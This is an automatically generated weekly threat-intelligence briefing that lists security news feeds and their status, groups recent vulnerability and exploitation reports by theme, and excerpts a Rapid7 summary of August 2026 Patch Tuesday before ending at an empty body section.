# PHANTOMSignal Briefing Packet

- Generated: 2026-08-18T03:01:29.045181+00:00
- Lookback hours: 168
- Lookback human: 7 days
- Total feeds: 80
- Feeds OK: 74
- Total items in window: 313
- Total clusters raw: 139
- Total clusters in packet: 66
- Dropped low score: 73
- Dropped overflow: 0

## Cohort metadata

### threat_research_primary
- Description: Primary vendor and research-team intelligence with strong technical depth.
- Source count: 16
- Weight: 10

### government_authoritative
- Description: Authoritative English-language public-sector sources for advisories, vulnerabilities, standards, and public guidance.
- Source count: 2
- Weight: 9

### offensive_vulnerability_research
- Description: High-signal vulnerability research, offensive security analysis, and exploitability-focused sources.
- Source count: 9
- Weight: 10

### detection_response_operations
- Description: Practitioner-oriented sources focused on detection, response, hunting, MDR, and security operations.
- Source count: 11
- Weight: 8

### cloud_identity_infrastructure
- Description: Cloud, identity, SaaS, and infrastructure security research with emphasis on modern attack surfaces.
- Source count: 9
- Weight: 7

### ai_security_agentic_risk
- Description: AI security, LLM exploitation, model integrity, agentic system risk, and AI governance sources.
- Source count: 7
- Weight: 6

### ransomware_ecrime_financial_crime
- Description: Cybercrime, ransomware, extortion, fraud, and illicit financial ecosystem reporting.
- Source count: 4
- Weight: 7

### cyber_news_breach_reporting
- Description: Cybersecurity news, breach reporting, and industry trend coverage. Useful for awareness, not sufficient alone for technical claims.
- Source count: 8
- Weight: 4

### policy_strategy_geopolitics
- Description: Policy, strategy, cyber norms, geopolitics, national security, and regulatory interpretation.
- Source count: 1
- Weight: 5

### practitioner_analysis
- Description: Independent practitioner, researcher, and analyst voices. Best used for framing, interpretation, and reality checks.
- Source count: 6
- Weight: 5

### reddit_practitioner_osint
- Description: Reddit-based practitioner chatter and operational OSINT. Useful for weak signals, field texture, and reality checks, but never sufficient alone for technical claims.
- Source count: 7
- Weight: 2

## Feed status

- **Unit 42** (threat_research_primary)
  - URL: https://unit42.paloaltonetworks.com/feed/
  - Status: ok
  - Item count: 15
  - In window count: 1
- **CrowdStrike** (threat_research_primary)
  - URL: https://www.crowdstrike.com/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Trend Micro Research** (threat_research_primary)
  - URL: https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787
  - Status: ok
  - Item count: 25
  - In window count: 0
- **Microsoft Security Blog** (threat_research_primary)
  - URL: https://www.microsoft.com/en-us/security/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Google Threat Analysis Group** (threat_research_primary)
  - URL: https://blog.google/threat-analysis-group/rss/
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **SentinelOne Labs** (threat_research_primary)
  - URL: https://www.sentinelone.com/labs/feed/
  - Status: ok
  - Item count: 10
  - In window count: 1
- **Sekoia** (threat_research_primary)
  - URL: https://blog.sekoia.io/feed/
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Microsoft Threat Intelligence** (threat_research_primary)
  - URL: https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Citizen Lab** (threat_research_primary)
  - URL: https://citizenlab.ca/feed/
  - Status: ok
  - Item count: 10
  - In window count: 1
- **Check Point Research** (threat_research_primary)
  - URL: https://research.checkpoint.com/feed/
  - Status: ok
  - Item count: 15
  - In window count: 3
- **Kaspersky Securelist** (threat_research_primary)
  - URL: https://securelist.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 4
- **NCSC UK** (government_authoritative)
  - URL: https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml
  - Status: ok
  - Item count: 20
  - In window count: 3
- **SANS Internet Storm Center** (government_authoritative)
  - URL: https://isc.sans.edu/rssfeed_full.xml
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Cisco Talos** (threat_research_primary)
  - URL: https://feeds.feedburner.com/feedburner/Talos
  - Status: ok
  - Item count: 15
  - In window count: 3
- **ESET WeLiveSecurity** (threat_research_primary)
  - URL: https://www.welivesecurity.com/en/rss/feed/
  - Status: ok
  - Item count: 100
  - In window count: 3
- **Volexity** (threat_research_primary)
  - URL: https://www.volexity.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - URL: https://horizon3.ai/feed/
  - Status: ok
  - Item count: 10
  - In window count: 4
- **Recorded Future** (threat_research_primary)
  - URL: https://www.recordedfuture.com/feed
  - Status: ok
  - Item count: 50
  - In window count: 1
- **Red Canary** (detection_response_operations)
  - URL: https://redcanary.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **PortSwigger Research** (offensive_vulnerability_research)
  - URL: https://portswigger.net/research/rss
  - Status: ok
  - Item count: 40
  - In window count: 0
- **Exploit-DB** (offensive_vulnerability_research)
  - URL: https://www.exploit-db.com/rss.xml
  - Status: ok
  - Item count: 50
  - In window count: 11
- **GitHub Security Lab** (offensive_vulnerability_research)
  - URL: https://github.blog/category/security/feed/
  - Status: ok
  - Item count: 10
  - In window count: 1
- **watchTowr Labs** (offensive_vulnerability_research)
  - URL: https://labs.watchtowr.com/rss/
  - Status: ok
  - Item count: 15
  - In window count: 1
- **The DFIR Report** (detection_response_operations)
  - URL: https://thedfirreport.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Assetnote** (offensive_vulnerability_research)
  - URL: https://www.assetnote.io/resources/research/rss.xml
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Black Hills Information Security** (detection_response_operations)
  - URL: https://www.blackhillsinfosec.com/feed/
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Proofpoint Threat Insight** (detection_response_operations)
  - URL: https://www.proofpoint.com/us/rss.xml
  - Status: ok
  - Item count: 10
  - In window count: 0
- **TrustedSec** (detection_response_operations)
  - URL: https://www.trustedsec.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 2
- **Active Countermeasures** (detection_response_operations)
  - URL: https://www.activecountermeasures.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Sophos X-Ops** (detection_response_operations)
  - URL: https://news.sophos.com/en-us/category/threat-research/feed/
  - Status: ok
  - Item count: 15
  - In window count: 0
- **Elastic Security Labs** (detection_response_operations)
  - URL: https://www.elastic.co/security-labs/rss/feed.xml
  - Status: ok
  - Item count: 20
  - In window count: 0
- **Datadog Security Labs** (cloud_identity_infrastructure)
  - URL: https://securitylabs.datadoghq.com/rss/feed.xml
  - Status: ok
  - Item count: 30
  - In window count: 0
- **SpecterOps** (detection_response_operations)
  - URL: https://medium.com/feed/specter-ops-posts
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Orca Security Research** (cloud_identity_infrastructure)
  - URL: https://orca.security/resources/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **AWS Security Blog** (cloud_identity_infrastructure)
  - URL: https://aws.amazon.com/blogs/security/feed/
  - Status: ok
  - Item count: 20
  - In window count: 6
- **Permiso Security** (cloud_identity_infrastructure)
  - URL: https://permiso.io/blog/rss.xml
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Google Cloud Threat Intelligence** (threat_research_primary)
  - URL: https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v
  - Status: ok
  - Item count: 20
  - In window count: 0
- **Huntress** (detection_response_operations)
  - URL: https://www.huntress.com/blog/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 0
- **Protect AI** (ai_security_agentic_risk)
  - URL: https://protectai.com/blog/rss.xml
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Trail of Bits** (offensive_vulnerability_research)
  - URL: https://blog.trailofbits.com/feed/
  - Status: ok
  - Item count: 20
  - In window count: 1
- **Rapid7** (offensive_vulnerability_research)
  - URL: https://www.rapid7.com/blog/rss/
  - Status: ok
  - Item count: 20
  - In window count: 7
- **Sysdig** (detection_response_operations)
  - URL: https://sysdig.com/feed/
  - Status: ok
  - Item count: 100
  - In window count: 1
- **Cloudflare Security** (cloud_identity_infrastructure)
  - URL: https://blog.cloudflare.com/tag/security/rss/
  - Status: ok
  - Item count: 20
  - In window count: 0
- **Wiz Research** (cloud_identity_infrastructure)
  - URL: https://www.wiz.io/feed/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 6
- **Cloudflare Radar** (cloud_identity_infrastructure)
  - URL: https://blog.cloudflare.com/tag/cloudflare-radar/rss/
  - Status: ok
  - Item count: 20
  - In window count: 2
- **Google DeepMind Blog** (ai_security_agentic_risk)
  - URL: https://deepmind.google/blog/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 2
- **Coveware** (ransomware_ecrime_financial_crime)
  - URL: https://www.coveware.com/blog?format=rss
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Chainalysis** (ransomware_ecrime_financial_crime)
  - URL: https://www.chainalysis.com/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 1
- **OpenSSF Blog** (ai_security_agentic_risk)
  - URL: https://openssf.org/feed/
  - Status: ok
  - Item count: 10
  - In window count: 3
- **The Record** (cyber_news_breach_reporting)
  - URL: https://therecord.media/feed
  - Status: ok
  - Item count: 5
  - In window count: 5
- **Interconnects** (ai_security_agentic_risk)
  - URL: https://www.interconnects.ai/feed
  - Status: ok
  - Item count: 20
  - In window count: 3
- **Google Cloud Security** (cloud_identity_infrastructure)
  - URL: https://cloudblog.withgoogle.com/rss/
  - Status: ok
  - Item count: 20
  - In window count: 6
- **BleepingComputer** (cyber_news_breach_reporting)
  - URL: https://www.bleepingcomputer.com/feed/
  - Status: ok
  - Item count: 15
  - In window count: 15
- **GreyNoise** (cloud_identity_infrastructure)
  - URL: https://www.greynoise.io/blog/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 2
- **SecurityWeek** (cyber_news_breach_reporting)
  - URL: https://www.securityweek.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **CyberScoop** (cyber_news_breach_reporting)
  - URL: https://cyberscoop.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Help Net Security** (cyber_news_breach_reporting)
  - URL: https://www.helpnetsecurity.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Dark Reading** (cyber_news_breach_reporting)
  - URL: https://www.darkreading.com/rss.xml
  - Status: ok
  - Item count: 50
  - In window count: 18
- **AI Snake Oil** (ai_security_agentic_risk)
  - URL: https://www.aisnakeoil.com/feed
  - Status: ok
  - Item count: 20
  - In window count: 0
- **Simon Willison** (ai_security_agentic_risk)
  - URL: https://simonwillison.net/atom/everything/
  - Status: ok
  - Item count: 30
  - In window count: 18
- **Schneier on Security** (practitioner_analysis)
  - URL: https://www.schneier.com/feed/atom/
  - Status: ok
  - Item count: 10
  - In window count: 8
- **Troy Hunt** (practitioner_analysis)
  - URL: https://www.troyhunt.com/rss/
  - Status: ok
  - Item count: 15
  - In window count: 1
- **Krebs on Security** (practitioner_analysis)
  - URL: https://krebsonsecurity.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 2
- **Team Cymru** (ransomware_ecrime_financial_crime)
  - URL: https://www.team-cymru.com/post/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 1
- **Reddit r/cybersecurity** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/cybersecurity/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Reddit r/blueteamsec** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/blueteamsec/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Reddit r/sysadmin** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/sysadmin/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Reddit r/msp** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/msp/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Reddit r/netsecstudents** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/netsecstudents/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Reddit r/AskNetsec** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/AskNetsec/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **The Hacker News** (cyber_news_breach_reporting)
  - URL: https://feeds.feedburner.com/TheHackersNews
  - Status: ok
  - Item count: 50
  - In window count: 50
- **Graham Cluley** (practitioner_analysis)
  - URL: https://grahamcluley.com/feed/
  - Status: ok
  - Item count: 20
  - In window count: 2
- **Intel 471** (ransomware_ecrime_financial_crime)
  - URL: https://intel471.com/blog/feed
  - Status: ok
  - Item count: 100
  - In window count: 1
- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - URL: https://www.infosecurity-magazine.com/rss/news/
  - Status: ok
  - Item count: 100
  - In window count: 28
- **Reddit r/netsec** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/netsec/.rss
  - Status: ok
  - Item count: 25
  - In window count: 17
- **tl;dr sec** (practitioner_analysis)
  - URL: https://tldrsec.com/feed.xml
  - Status: ok
  - Item count: 20
  - In window count: 1
- **Embrace the Red** (ai_security_agentic_risk)
  - URL: https://embracethered.com/blog/index.xml
  - Status: ok
  - Item count: 100
  - In window count: 1
- **Risky Business News** (practitioner_analysis)
  - URL: https://risky.biz/feeds/risky-business-news/
  - Status: ok
  - Item count: 100
  - In window count: 6
- **Just Security** (policy_strategy_geopolitics)
  - URL: https://www.justsecurity.org/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Google Project Zero** (offensive_vulnerability_research)
  - URL: https://googleprojectzero.blogspot.com/feeds/posts/default
  - Status: ok
  - Item count: 10
  - In window count: 0

## Affinity groups (themes)

### CVE-2026-68820 exploitation (Microsoft SharePoint)
- Anchor signal: CVE-2026-68820
- Theme key: cve-2026-68820
- Cluster count: 9
- Article count: 17
- Cohesion: 0.25
- Shared strong signals: CVE-2026-68820
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: zero_day, active_exploitation, phishing_social_eng
  - actor_attribution: Lazarus
  - affected_industries: financial_services
  - affected_products: Microsoft SharePoint
  - cve_ids: CVE-2026-68820
  - urgency_signals: actively_exploited, zero_day
- Cluster IDs: 17761b9ecf, c13f381a5a, ef336b7141, 02b0e547f6, 7e142768f0, b4927a86ad, 22bf2708a0, 7f18333ab6, 388705e7c7
- Links:
  - https://www.rapid7.com/blog/post/em-patch-tuesday-august-2026
  - https://thehackernews.com/2026/08/researchers-disclose-ai-assisted.html
  - https://research.checkpoint.com/2026/shattering-the-dream-when-a-job-offer-becomes-a-zero-day-attack/
  - https://krebsonsecurity.com/2026/08/microsoft-plugs-nearly-400-security-holes/
  - https://www.darkreading.com/application-security/microsofts-patch-tuesday-deluge-continues
  - https://research.checkpoint.com/2026/17th-august-threat-intelligence-report/
  - https://blog.talosintelligence.com/microsoft-patch-tuesday-for-august-2026/
  - https://thehackernews.com/2026/08/lazarus-exploits-windows-zero-day-to.html
  - https://www.infosecurity-magazine.com/news/lazarus-post-quantum-key-dream-job/
  - https://thehackernews.com/2026/08/microsoft-patches-398-flaws-including.html
  - https://www.helpnetsecurity.com/2026/08/17/windows-11-security-bypass-research/
  - https://thehackernews.com/2026/08/weekly-recap-vmware-exploits-windows-0.html

### Apple iOS/macOS active exploitation
- Anchor signal: Apple iOS/macOS
- Theme key: apple-ios-macos
- Cluster count: 8
- Article count: 17
- Cohesion: 0.237
- Shared strong signals: Apple iOS/macOS
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: data_breach, active_exploitation, phishing_social_eng
  - affected_industries: financial_services, government
  - affected_products: Apple iOS/macOS
  - urgency_signals: actively_exploited
- Cluster IDs: 1580e2d432, cb8fdf38e7, a50e916d10, 7e142768f0, ff9d8c251f, 1ac2c2cb37, 388705e7c7, 20c2a82904
- Links:
  - https://www.helpnetsecurity.com/2026/08/17/apple-macos-screen-sharing-flaw/
  - https://thehackernews.com/2026/08/apple-macos-screen-sharing-flaw.html
  - https://isc.sans.edu/diary/rss/33254
  - https://www.securityweek.com/recent-macos-screen-sharing-vulnerability-exploited-in-attacks/
  - https://risky.biz/RBNEWS600/
  - https://www.bleepingcomputer.com/news/security/new-amnesiastealer-macos-malware-hijacks-browser-sessions-via-remote-control/
  - https://www.infosecurity-magazine.com/news/macos-infostealer-spread-clickfix/
  - https://orca.security/resources/research-pod/zoom-zero-click-rce-vulnerability-orca-security/
  - https://thehackernews.com/2026/08/sap-commerce-cloud-cve-2026-58231.html
  - https://www.securityweek.com/critical-sap-commerce-cloud-vulnerability-exploited-3-days-after-disclosure/
  - https://research.checkpoint.com/2026/17th-august-threat-intelligence-report/
  - https://www.securityweek.com/680000-impacted-by-french-tax-authority-data-breach/
  - https://www.securityweek.com/40000-impacted-by-safepal-data-breach/
  - https://thehackernews.com/2026/08/weekly-recap-vmware-exploits-windows-0.html
  - https://www.infosecurity-magazine.com/news/safepal-data-breach-tens-thousands/

### WordPress vulnerability activity
- Anchor signal: WordPress
- Theme key: wordpress
- Cluster count: 4
- Article count: 6
- Cohesion: 0.2
- Shared strong signals: WordPress
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - affected_products: WordPress, OpenAI/ChatGPT
  - urgency_signals: preauth_unauth
- Cluster IDs: a7b2f82e67, c13f381a5a, ad3b948659, b7b068c390
- Links:
  - https://thehackernews.com/2026/08/forminator-wordpress-flaw-can-enable.html
  - https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-lot-of-summer-shells-and-fit-http-profiles
  - https://www.infosecurity-magazine.com/news/wordpress-plugin-flaw-40000-sites/
  - https://research.checkpoint.com/2026/shattering-the-dream-when-a-job-offer-becomes-a-zero-day-attack/
  - https://www.exploit-db.com/exploits/52642
  - https://tldrsec.com/p/tldr-sec-341

### zero day targeting VMware
- Anchor signal: VMware
- Theme key: vmware
- Cluster count: 4
- Article count: 6
- Cohesion: 0.323
- Shared strong signals: VMware
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: zero_day, apt_espionage, web_shell_backdoor, ransomware_extortion, data_breach
  - affected_industries: government, financial_services
  - affected_products: VMware, Apple iOS/macOS, Fortinet
  - cve_ids: CVE-2026-59310
  - urgency_signals: zero_day, no_patch_yet
- Cluster IDs: 4535ef9ae8, ff9d8c251f, 1ac2c2cb37, 388705e7c7
- Links:
  - https://thehackernews.com/2026/08/attackers-exploit-vmware-vcenter.html
  - https://www.darkreading.com/vulnerabilities-threats/global-threat-campaign-critical-vmware-vcenter-flaw
  - https://www.securityweek.com/680000-impacted-by-french-tax-authority-data-breach/
  - https://www.securityweek.com/40000-impacted-by-safepal-data-breach/
  - https://thehackernews.com/2026/08/weekly-recap-vmware-exploits-windows-0.html

### Cisco active exploitation
- Anchor signal: Cisco
- Theme key: cisco
- Cluster count: 3
- Article count: 4
- Cohesion: 0.221
- Shared strong signals: Cisco
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: active_exploitation
  - affected_products: Cisco
  - urgency_signals: actively_exploited
- Cluster IDs: 496f8b853a, 452d902ac4, b4927a86ad
- Links:
  - https://thehackernews.com/2026/08/cisco-asa-and-ftd-flaw-exploited-in.html
  - https://blog.talosintelligence.com/dissecting-the-jwr-phishing-framework/
  - https://blog.talosintelligence.com/curiouser-and-curiouser/
  - https://blog.talosintelligence.com/microsoft-patch-tuesday-for-august-2026/

### Microsoft Windows exploitation (CVE-2026-50656)
- Anchor signal: Microsoft Windows
- Theme key: microsoft-windows
- Cluster count: 4
- Article count: 6
- Cohesion: 0.33
- Shared strong signals: Microsoft Windows
- Member CVEs: CVE-2026-50656
- Also targets: (none)
- Dominant features:
  - threat_categories: zero_day, vulnerability_disclosure
  - affected_products: Microsoft Windows, Microsoft Defender
  - cve_ids: CVE-2026-50656
  - urgency_signals: zero_day, poc_available
- Cluster IDs: 17761b9ecf, dcf9212f8f, 8fb5179107, 7f18333ab6
- Links:
  - https://www.rapid7.com/blog/post/em-patch-tuesday-august-2026
  - https://thehackernews.com/2026/08/researchers-disclose-ai-assisted.html
  - https://www.bleepingcomputer.com/news/security/microsoft-working-on-defender-patch-for-shieldbreak-zero-day/
  - https://thehackernews.com/2026/08/shieldbreak-zero-day-poc-claims.html
  - https://thehackernews.com/2026/08/microsoft-patches-398-flaws-including.html
  - https://www.helpnetsecurity.com/2026/08/17/windows-11-security-bypass-research/

### zero day targeting Microsoft Defender
- Anchor signal: Microsoft Defender
- Theme key: microsoft-defender
- Cluster count: 3
- Article count: 3
- Cohesion: 0.28
- Shared strong signals: Microsoft Defender
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: zero_day, vulnerability_disclosure
  - affected_products: Microsoft Defender, Microsoft Windows
  - cve_ids: CVE-2026-50656
  - urgency_signals: zero_day, poc_available
- Cluster IDs: dcf9212f8f, 21cbe0b5fa, 8fb5179107
- Links:
  - https://www.bleepingcomputer.com/news/security/microsoft-working-on-defender-patch-for-shieldbreak-zero-day/
  - https://securelist.com/honeymyte-coolclient-driver-rootkit/121028/
  - https://thehackernews.com/2026/08/shieldbreak-zero-day-poc-claims.html

### Linux kernel vulnerability activity
- Anchor signal: Linux kernel
- Theme key: linux-kernel
- Cluster count: 2
- Article count: 4
- Cohesion: 0.2
- Shared strong signals: Linux kernel
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - affected_products: Linux kernel
- Cluster IDs: a7b2f82e67, d8fada4bb9
- Links:
  - https://thehackernews.com/2026/08/forminator-wordpress-flaw-can-enable.html
  - https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-lot-of-summer-shells-and-fit-http-profiles
  - https://www.infosecurity-magazine.com/news/wordpress-plugin-flaw-40000-sites/
  - https://www.welivesecurity.com/en/business-security/black-hat-usa-2026-vulnerability-discovery-decline-ai-era/

### ransomware extortion targeting Android
- Anchor signal: Android
- Theme key: android
- Cluster count: 2
- Article count: 2
- Cohesion: 0.2
- Shared strong signals: Android
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: ransomware_extortion
  - affected_industries: financial_services
  - affected_products: Android, OpenAI/ChatGPT
- Cluster IDs: c13f381a5a, 2a12c51464
- Links:
  - https://research.checkpoint.com/2026/shattering-the-dream-when-a-job-offer-becomes-a-zero-day-attack/
  - https://research.checkpoint.com/2026/the-state-of-ransomware-q2-2026/

### apt espionage targeting UNC5174
- Anchor signal: UNC5174
- Theme key: unc5174
- Cluster count: 2
- Article count: 6
- Cohesion: 0.2
- Shared strong signals: UNC5174
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: apt_espionage, web_shell_backdoor
  - actor_attribution: UNC5174
- Cluster IDs: a50e916d10, 4535ef9ae8
- Links:
  - https://thehackernews.com/2026/08/sap-commerce-cloud-cve-2026-58231.html
  - https://www.securityweek.com/critical-sap-commerce-cloud-vulnerability-exploited-3-days-after-disclosure/
  - https://thehackernews.com/2026/08/attackers-exploit-vmware-vcenter.html
  - https://www.darkreading.com/vulnerabilities-threats/global-threat-campaign-critical-vmware-vcenter-flaw

### CVE-2026-71362 exploitation activity
- Anchor signal: CVE-2026-71362
- Theme key: cve-2026-71362
- Cluster count: 2
- Article count: 2
- Cohesion: 0.2
- Shared strong signals: CVE-2026-71362
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: active_exploitation
  - cve_ids: CVE-2026-71362
  - urgency_signals: actively_exploited
- Cluster IDs: 7e142768f0, c9c8258f83
- Links:
  - https://research.checkpoint.com/2026/17th-august-threat-intelligence-report/
  - https://thehackernews.com/2026/08/adobe-patches-three-cvss-100-coldfusion.html

### Microsoft BitLocker vulnerability activity
- Anchor signal: Microsoft BitLocker
- Theme key: microsoft-bitlocker
- Cluster count: 2
- Article count: 2
- Cohesion: 0.2
- Shared strong signals: Microsoft BitLocker
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - affected_products: Microsoft BitLocker
- Cluster IDs: dcf9212f8f, c63d21cf7f
- Links:
  - https://www.bleepingcomputer.com/news/security/microsoft-working-on-defender-patch-for-shieldbreak-zero-day/
  - https://www.ncsc.gov.uk/blogs/how-bitlocker-pins-help-protect-your-data-and-devices

## Forward signals

### Novelty
- Novel cves: 0
- Novel actors: 0
- Novel products: 0

### Velocity bursts (0)

### Leading edge (2)
- **Attackers exploit patched macOS Screen Sharing flaw to deploy cryptominer**
  - Cluster: 1580e2d432
  - Lead hours: 87.8
  - First source: Risky Business News
  - Later Tier 1 source: SANS Internet Storm Center
  - Shared signals: Apple iOS/macOS, CVE-2026-65400, GitHub
- **From Patch Tuesday to Pentest Wednesday®: How a Major Transportation Company Turned AWS Attack Paths Into Action**
  - Cluster: 6a4c525838
  - Lead hours: 7.4
  - First source: Schneier on Security
  - Later Tier 1 source: Horizon3 Attack Research
  - Shared signals: AWS

### Convergence (15)
- Pair: CVE-2026-50656 + Microsoft SharePoint (cluster 17761b9ecf, first observation: True)
- Pair: CVE-2026-62832 + Microsoft SharePoint (cluster 17761b9ecf, first observation: True)
- Pair: CVE-2026-63520 + Microsoft SharePoint (cluster 17761b9ecf, first observation: True)
- Pair: CVE-2026-68820 + Microsoft SharePoint (cluster 17761b9ecf, first observation: True)
- Pair: CVE-2026-8452 + Citrix (cluster 0e9ca139ce, first observation: True)
- Pair: CVE-2026-8452 + OpenAI/ChatGPT (cluster 0e9ca139ce, first observation: True)
- Pair: CVE-2026-65400 + Apple iOS/macOS (cluster 1580e2d432, first observation: True)
- Pair: CVE-2026-65400 + GitHub (cluster 1580e2d432, first observation: True)
- Pair: CVE-2026-15748 + Linux kernel (cluster a7b2f82e67, first observation: True)
- Pair: CVE-2026-15748 + SonicWall (cluster a7b2f82e67, first observation: True)
- Pair: CVE-2026-15748 + WordPress (cluster a7b2f82e67, first observation: True)
- Pair: CVE-2026-15826 + Linux kernel (cluster a7b2f82e67, first observation: True)
- Pair: CVE-2026-15826 + SonicWall (cluster a7b2f82e67, first observation: True)
- Pair: CVE-2026-15826 + WordPress (cluster a7b2f82e67, first observation: True)
- Pair: CVE-2026-46300 + SonicWall (cluster a7b2f82e67, first observation: True)

### Drift (4)
- **Lazarus** (cluster c13f381a5a)
  - New industries: (none)
  - New products: WordPress
  - Prior top industries: aviation_defense, critical_infrastructure, financial_services
  - Prior top products: Android, Microsoft Windows, OpenAI/ChatGPT
- **UNC5174** (cluster a50e916d10)
  - New industries: (none)
  - New products: Azure
  - Prior top industries: education, government, telecommunications
  - Prior top products: Anthropic/Claude, Apple iOS/macOS, VMware
- **UNC5221** (cluster a50e916d10)
  - New industries: (none)
  - New products: Anthropic/Claude, Apple iOS/macOS, Azure
  - Prior top industries: critical_infrastructure, legal_professional, telecommunications
  - Prior top products: AWS, Google Cloud, Microsoft 365
- **Kimsuky** (cluster 7e142768f0)
  - New industries: healthcare
  - New products: (none)
  - Prior top industries: critical_infrastructure, financial_services, government
  - Prior top products: Apple iOS/macOS, Microsoft 365, Microsoft SharePoint

### Persistence (10)
- actor_attribution: Cl0p (weeks observed: 6, cluster fb556ca51b)
- cve_ids: CVE-2026-50656 (weeks observed: 5, cluster 17761b9ecf)
- actor_attribution: Lazarus (weeks observed: 4, cluster c13f381a5a)
- actor_attribution: Mustang Panda (weeks observed: 4, cluster 21cbe0b5fa)
- cve_ids: CVE-2026-59310 (weeks observed: 4, cluster 4535ef9ae8)
- cve_ids: CVE-2026-18556 (weeks observed: 3, cluster 67b968df05)
- cve_ids: CVE-2026-18577 (weeks observed: 3, cluster 67b968df05)
- cve_ids: CVE-2026-46300 (weeks observed: 3, cluster a7b2f82e67)
- actor_attribution: Kimsuky (weeks observed: 3, cluster 7e142768f0)
- cve_ids: CVE-2026-59309 (weeks observed: 3, cluster 4535ef9ae8)

### Tier inversion (1)
- **CVE-2026-33696: From a Schema Name to RCE in n8n**
  - Cluster: 7029814c59
  - Primary source: Reddit r/netsec
  - Strong signals: CVE-2026-33696

## Clusters

### Cluster 17761b9ecf — score 46

- Title: Patch Tuesday - August 2026
- Source: Rapid7 (offensive_vulnerability_research)
- Published: 2026-08-11T21:10:55+00:00
- Link: https://www.rapid7.com/blog/post/em-patch-tuesday-august-2026
- Fetch status: ok
- Member count: 5
- Corroborating source count: 2
- Strong signals: CVE-2026-63520, Microsoft SharePoint

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, zero_day
- affected_industries: financial_services
- affected_products: Microsoft SharePoint
- cve_ids: CVE-2026-50656, CVE-2026-55040, CVE-2026-62832, CVE-2026-63520, CVE-2026-68820
- urgency_signals: actively_exploited, critical_cvss, poc_available, preauth_unauth, zero_day
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_1_offensive_research, tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, active_exploitation
- affected_industries: financial_services
- affected_products: Microsoft SharePoint
- cve_ids: CVE-2026-63520, CVE-2026-55040, CVE-2026-68820, CVE-2026-62832, CVE-2026-50656
- urgency_signals: actively_exploited, zero_day, preauth_unauth
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
Microsoft is publishing 421 vulnerabilities on August 2026 Patch Tuesday , including 236 vulnerabilities in Windows. This is lower volume than last month’s record-breaking behemoth, but still one of the largest Patch Tuesday totals ever. There is no reason to suppose that Patch Tuesday will ever return to the lower volumes we saw prior to 2026. Microsoft is aware of exploitation in the wild for one of the vulnerabilities published today, as well as public disclosure for two others, although the Notable CVEs section of the Security Update Guide omits one of these. As usual, browser vulns are not included in the Patch Tuesday count above, but unusually, Microsoft does not appear to have published any desktop browser security patches so far this month. SharePoint: critical RCE chain by Rapid7 Today sees the publication of CVE-2026-63520 , a high-severity remote code execution in Microsoft SharePoint. Discovered by Rapid7 Senior Principal Security Researcher Stephen Fewer , and published t
```

#### Full body

```
